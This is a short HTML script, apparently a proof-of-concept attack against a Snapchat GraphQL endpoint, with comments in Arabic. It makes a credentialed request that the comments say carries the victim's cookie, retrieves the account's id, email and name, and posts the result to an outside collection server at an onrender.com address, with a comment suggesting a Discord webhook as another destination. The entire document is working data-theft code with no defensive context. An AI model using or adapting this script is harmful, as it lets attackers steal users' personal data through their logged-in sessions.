<script>
fetch("https://gcp.api.snapchat.com/gfg/?op=FetchUserInfoQuery", {
  method: "POST",
  credentials: "include", // نرسل كوكي الضحية
  headers: {
    "Content-Type": "application/json"
  },
  body: JSON.stringify({
    "operationName": "FetchUserInfoQuery",
    "variables": {},
    "query": "query FetchUserInfoQuery { me { id email name __typename } }"
  })
})
.then(res => res.text())
.then(data => {
  // تطبع البيانات في صفحة المهاجم أو ترسلها لسيرفر ثاني
  document.body.innerHTML = "<pre>" + data + "</pre>";

  // أو ترسلها لبريدك/Discord/Webhook
  fetch("https://ssrf-52rk.onrender.com", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ snapchat_response: data })
  });
});
</script>
